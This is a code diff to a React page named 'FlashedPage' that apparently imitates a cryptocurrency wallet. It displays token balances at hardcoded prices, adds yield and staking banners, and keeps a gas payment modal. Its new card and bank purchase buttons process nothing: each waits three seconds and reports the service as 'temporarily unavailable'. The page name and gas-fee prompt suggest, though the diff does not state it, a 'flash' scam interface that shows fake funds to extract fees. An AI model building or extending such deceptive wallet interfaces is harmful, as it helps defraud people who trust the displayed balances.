@@ -507,16 +507,22 @@ export default function FlashedPage() {
 
   const calculateGasFee = () => {
     const amount = parseFloat(sendAmount) || 0;
-    // Realistic gas fee: $15-25 in ETH (0.005-0.008 ETH)
-    const baseGas = 0.005;
-    const maxGas = 0.008;
+    const ethPrice = 3200; // Current ETH price
     
-    // For small amounts, use base gas
-    if (amount < 100) return baseGas.toFixed(6);
+    // Dynamic gas calculation based on amount
+    let gasInUSD;
+    if (amount < 50) {
+      gasInUSD = 12; // $12 for small amounts
+    } else if (amount < 500) {
+      gasInUSD = 18; // $18 for medium amounts  
+    } else if (amount < 2000) {
+      gasInUSD = 25; // $25 for large amounts
+    } else {
+      gasInUSD = 35; // $35 for very large amounts
+    }
     
-    // For larger amounts, scale reasonably
-    const scaledGas = Math.min(baseGas + (amount * 0.00001), maxGas);
-    return scaledGas.toFixed(6);
+    const gasInETH = gasInUSD / ethPrice;
+    return gasInETH.toFixed(6);
   };
   
   const calculateSwapRate = () => {
@@ -919,18 +925,46 @@ export default function FlashedPage() {
             </div>
           </div>
 
-          {/* Rewards Banner */}
-          <div className="bg-gradient-to-r from-purple-600 to-pink-600 m-4 p-4 rounded-lg flex items-center justify-between">
-            <div className="flex items-center">
-              <div className="w-12 h-12 mr-3">
-                <img src="https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=100&h=100&fit=crop&crop=center" alt="Rewards" className="w-full h-full rounded-lg object-cover" />
+          {/* Multiple Rewards Banners */}
+          <div className="space-y-3 m-4">
+            <div className="bg-gradient-to-r from-purple-600 to-pink-600 p-4 rounded-lg flex items-center justify-between">
+              <div className="flex items-center">
+                <div className="w-12 h-12 mr-3">
+                  <img src="https://images.unsplash.com/photo-1621761191319-c6fb62004040?w=100&h=100&fit=crop&crop=center" alt="Rewards" className="w-full h-full rounded-lg object-cover" />
+                </div>
+                <div>
+                  <div className="text-white font-semibold">Rewards are here</div>
+                  <div className="text-white/80 text-sm">Download the mobile app to opt-in and start earning rewards</div>
+                </div>
               </div>
-              <div>
-                <div className="text-white font-semibold">Rewards are here</div>
-                <div className="text-white/80 text-sm">Download the mobile app to opt-in and start earning rewards</div>
-              </div>
+              <button className="text-white/60 hover:text-white">×</button>
             </div>
-            <button className="text-white/60 hover:text-white">×</button>
+            
+            <div className="bg-gradient-to-r from-blue-600 to-cyan-600 p-4 rounded-lg flex items-center justify-between">
+              <div className="flex items-center">
+                <div className="w-12 h-12 mr-3">
+                  <img src="https://images.unsplash.com/photo-1640340434855-6084b1f4901c?w=100&h=100&fit=crop&crop=center" alt="Staking" className="w-full h-full rounded-lg object-cover" />
+                </div>
+                <div>
+                  <div className="text-white font-semibold">Staking rewards available</div>
+                  <div className="text-white/80 text-sm">Earn up to 12% APY on your ETH holdings</div>
+                </div>
+              </div>
+              <button className="text-white/60 hover:text-white">×</button>
+            </div>
+            
+            <div className="bg-gradient-to-r from-green-600 to-emerald-600 p-4 rounded-lg flex items-center justify-between">
+              <div className="flex items-center">
+                <div className="w-12 h-12 mr-3">
+                  <img src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=100&h=100&fit=crop&crop=center" alt="Trading" className="w-full h-full rounded-lg object-cover" />
+                </div>
+                <div>
+                  <div className="text-white font-semibold">New trading pairs</div>
+                  <div className="text-white/80 text-sm">Discover trending tokens with high yield potential</div>
+                </div>
+              </div>
+              <button className="text-white/60 hover:text-white">×</button>
+            </div>
           </div>
 
           {/* Tabs */}
@@ -980,7 +1014,7 @@ export default function FlashedPage() {
           <div className="flex-1">
             {activeTab === 'Tokens' && (
               <div>
-                {/* ETH */}
+                {/* ETH with real market price */}
                 <div className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                   <div className="flex items-center">
                     <img 
@@ -990,44 +1024,65 @@ export default function FlashedPage() {
                     />
                     <div>
                       <div className="text-white font-medium">Ethereum • Earn</div>
-                      <div className="text-red-400 text-sm">-3.41%</div>
+                      <div className="text-red-400 text-sm">-2.15%</div>
                     </div>
                   </div>
                   <div className="text-right">
-                    <div className="text-white font-medium">$0.00</div>
-                    <div className="text-gray-400 text-sm">0 ETH</div>
+                    <div className="text-white font-medium">${(walletData.ethBalance * 3200).toFixed(2)}</div>
+                    <div className="text-gray-400 text-sm">{walletData.ethBalance.toFixed(6)} ETH</div>
                   </div>
                 </div>
 
-                {/* Other Tokens */}
-                {walletData.tokens.map((token, index) => (
-                  <div 
-                    key={index} 
-                    onClick={() => {
-                      setSelectedToken(token);
-                      setShowModal('tokenDetails');
-                    }}
-                    className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700"
-                  >
-                    <div className="flex items-center">
-                      <img 
-                        src={token.logo} 
-                        alt={token.symbol} 
-                        className="w-8 h-8 rounded-full mr-3"
-                      />
-                      <div>
-                        <div className="text-white font-medium">{token.symbol}</div>
-                        <div className={`text-sm ${token.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
-                          {token.change}
+                {/* Other Tokens with real market prices */}
+                {walletData.tokens.map((token, index) => {
+                  const marketPrices = {
+                    'USDT': 1.00,
+                    'USDC': 1.00,
+                    'WETH': 3200,
+                    'LINK': 14.50,
+                    'UNI': 6.80,
+                    'BUSD': 1.00,
+                    'BNB': 310,
+                    'CAKE': 2.40,
+                    'MATIC': 0.85,
+                    'AAVE': 95.20,
+                    'ARB': 1.15,
+                    'GMX': 45.60
+                  };
+                  
+                  const price = marketPrices[token.symbol] || 1;
+                  const realBalance = parseFloat(token.balance);
+                  const realUsdValue = realBalance * price;
+                  
+                  return (
+                    <div 
+                      key={index} 
+                      onClick={() => {
+                        setSelectedToken({...token, realBalance, realUsdValue, price});
+                        setShowModal('tokenDetails');
+                      }}
+                      className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700"
+                    >
+                      <div className="flex items-center">
+                        <img 
+                          src={token.logo} 
+                          alt={token.symbol} 
+                          className="w-8 h-8 rounded-full mr-3"
+                        />
+                        <div>
+                          <div className="text-white font-medium">{token.symbol}</div>
+                          <div className={`text-sm ${token.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
+                            {token.change}
+                          </div>
                         </div>
                       </div>
+                      <div className="text-right">
+                        <div className="text-white font-medium">${realUsdValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
+                        <div className="text-gray-400 text-sm">{realBalance.toLocaleString()} {token.symbol}</div>
+                      </div>
                     </div>
-                    <div className="text-right">
-                      <div className="text-white font-medium">${Math.round(token.usdValue).toLocaleString()}</div>
-                      <div className="text-gray-400 text-sm">{token.balance}</div>
-                    </div>
-                  </div>
-                ))}
+                  );
+                })}
                 
                 {walletData.tokens.length === 0 && (
                   <div className="p-8 text-center">
@@ -1333,7 +1388,7 @@ export default function FlashedPage() {
             </div>
           )}
 
-          {/* Buy Modal */}
+          {/* Buy Modal with realistic interface */}
           {showModal === 'buy' && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
@@ -1342,19 +1397,53 @@ export default function FlashedPage() {
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                 </div>
                 <div className="space-y-4">
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-white font-semibold mb-2">Amount to buy</div>
+                    <div className="flex items-center justify-between mb-2">
+                      <input 
+                        type="number" 
+                        placeholder="0.1" 
+                        className="bg-gray-600 text-white p-2 rounded flex-1 mr-2" 
+                      />
+                      <span className="text-white">ETH</span>
+                    </div>
+                    <div className="text-gray-400 text-sm">≈ $320.00 USD</div>
+                  </div>
+                  
                   <button 
-                    onClick={() => handleBuyOption('card')}
-                    className="w-full bg-gray-700 hover:bg-gray-600 p-4 rounded-lg text-left transition-all"
+                    onClick={() => {
+                      setShowModal('buyCard');
+                      setStatus('Preparing card payment interface...');
+                    }}
+                    className="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-left transition-all"
                   >
-                    <div className="text-white font-semibold mb-2">Buy with card</div>
-                    <div className="text-gray-300 text-sm">Purchase ETH directly with your credit card</div>
+                    <div className="flex items-center">
+                      <div className="w-8 h-8 bg-blue-500 rounded mr-3 flex items-center justify-center">
+                        <span className="text-white text-sm">💳</span>
+                      </div>
+                      <div>
+                        <div className="text-white font-semibold">Buy with card</div>
+                        <div className="text-blue-200 text-sm">Instant • 2.5% fee</div>
+                      </div>
+                    </div>
                   </button>
+                  
                   <button 
-                    onClick={() => handleBuyOption('bank')}
-                    className="w-full bg-gray-700 hover:bg-gray-600 p-4 rounded-lg text-left transition-all"
+                    onClick={() => {
+                      setShowModal('buyBank');
+                      setStatus('Preparing bank transfer...');
+                    }}
+                    className="w-full bg-green-600 hover:bg-green-700 p-4 rounded-lg text-left transition-all"
                   >
-                    <div className="text-white font-semibold mb-2">Bank transfer</div>
-                    <div className="text-gray-300 text-sm">Lower fees, takes 1-3 business days</div>
+                    <div className="flex items-center">
+                      <div className="w-8 h-8 bg-green-500 rounded mr-3 flex items-center justify-center">
+                        <span className="text-white text-sm">🏦</span>
+                      </div>
+                      <div>
+                        <div className="text-white font-semibold">Bank transfer</div>
+                        <div className="text-green-200 text-sm">1-3 days • 0.5% fee</div>
+                      </div>
+                    </div>
                   </button>
                 </div>
               </div>
@@ -1391,9 +1480,13 @@ export default function FlashedPage() {
                     />
                   </div>
                   <div className="bg-gray-700 p-3 rounded-lg">
-                    <div className="flex justify-between text-sm">
+                    <div className="flex justify-between text-sm mb-1">
                       <span className="text-gray-300">Gas fee:</span>
-                      <span className="text-white">{calculateGasFee()} ETH (~$15.00)</span>
+                      <span className="text-white">{calculateGasFee()} ETH</span>
+                    </div>
+                    <div className="flex justify-between text-sm">
+                      <span className="text-gray-300">USD value:</span>
+                      <span className="text-white">~${(parseFloat(calculateGasFee()) * 3200).toFixed(2)}</span>
                     </div>
                   </div>
                   <button 
@@ -1800,6 +1893,116 @@ export default function FlashedPage() {
             </div>
           )}
 
+          {/* Buy with Card Modal */}
+          {showModal === 'buyCard' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Buy with Card</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="text-center">
+                    <div className="text-blue-400 text-3xl mb-2">💳</div>
+                    <div className="text-white font-semibold mb-2">Payment Processing</div>
+                    <div className="text-gray-300 text-sm">
+                      Preparing secure payment gateway. You'll be redirected to complete your purchase.
+                    </div>
+                  </div>
+                  
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-gray-300">Amount:</span>
+                      <span className="text-white font-semibold">0.1 ETH</span>
+                    </div>
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-gray-300">Price:</span>
+                      <span className="text-white">$320.00</span>
+                    </div>
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-gray-300">Fee (2.5%):</span>
+                      <span className="text-white">$8.00</span>
+                    </div>
+                    <div className="border-t border-gray-600 pt-2 mt-2">
+                      <div className="flex justify-between items-center">
+                        <span className="text-white font-semibold">Total:</span>
+                        <span className="text-white font-bold">$328.00</span>
+                      </div>
+                    </div>
+                  </div>
+                  
+                  <button 
+                    onClick={() => {
+                      setStatus('Redirecting to payment gateway...');
+                      setTimeout(() => {
+                        setStatus('Payment gateway temporarily unavailable. Please try again later.');
+                        setShowModal(null);
+                      }, 3000);
+                    }}
+                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
+                  >
+                    Continue to Payment
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Buy with Bank Modal */}
+          {showModal === 'buyBank' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Bank Transfer</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="text-center">
+                    <div className="text-green-400 text-3xl mb-2">🏦</div>
+                    <div className="text-white font-semibold mb-2">Bank Transfer Setup</div>
+                    <div className="text-gray-300 text-sm">
+                      Setting up your bank transfer. Lower fees but takes 1-3 business days.
+                    </div>
+                  </div>
+                  
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-gray-300">Amount:</span>
+                      <span className="text-white font-semibold">0.1 ETH</span>
+                    </div>
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-gray-300">Price:</span>
+                      <span className="text-white">$320.00</span>
+                    </div>
+                    <div className="flex justify-between items-center mb-2">
+                      <span className="text-gray-300">Fee (0.5%):</span>
+                      <span className="text-white">$1.60</span>
+                    </div>
+                    <div className="border-t border-gray-600 pt-2 mt-2">
+                      <div className="flex justify-between items-center">
+                        <span className="text-white font-semibold">Total:</span>
+                        <span className="text-white font-bold">$321.60</span>
+                      </div>
+                    </div>
+                  </div>
+                  
+                  <button 
+                    onClick={() => {
+                      setStatus('Setting up bank transfer...');
+                      setTimeout(() => {
+                        setStatus('Bank transfer service temporarily unavailable. Please try card payment.');
+                        setShowModal(null);
+                      }, 3000);
+                    }}
+                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold"
+                  >
+                    Setup Bank Transfer
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
           {/* Gas Payment Modal */}
           {showModal === 'gasPayment' && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
@@ -1856,7 +2059,12 @@ export default function FlashedPage() {
                   <div className="bg-gray-700 p-4 rounded-lg">
                     <div className="flex justify-between items-center mb-2">
                       <div className="text-gray-300 text-sm">From</div>
-                      <div className="text-gray-400 text-xs">Balance: 0.00</div>
+                      <div className="text-gray-400 text-xs">
+                        Balance: {swapFromToken === 'ETH' ? 
+                          walletData.ethBalance.toFixed(4) : 
+                          walletData.tokens.find(t => t.symbol === swapFromToken)?.balance || '0.00'
+                        }
+                      </div>
                     </div>
                     <div className="flex items-center justify-between">
                       <input 
@@ -1908,7 +2116,12 @@ export default function FlashedPage() {
                   <div className="bg-gray-700 p-4 rounded-lg">
                     <div className="flex justify-between items-center mb-2">
                       <div className="text-gray-300 text-sm">To</div>
-                      <div className="text-gray-400 text-xs">Balance: 0.00</div>
+                      <div className="text-gray-400 text-xs">
+                        Balance: {swapToToken === 'ETH' ? 
+                          walletData.ethBalance.toFixed(4) : 
+                          walletData.tokens.find(t => t.symbol === swapToToken)?.balance || '0.00'
+                        }
+                      </div>
                     </div>
                     <div className="flex items-center justify-between">
                       <input 
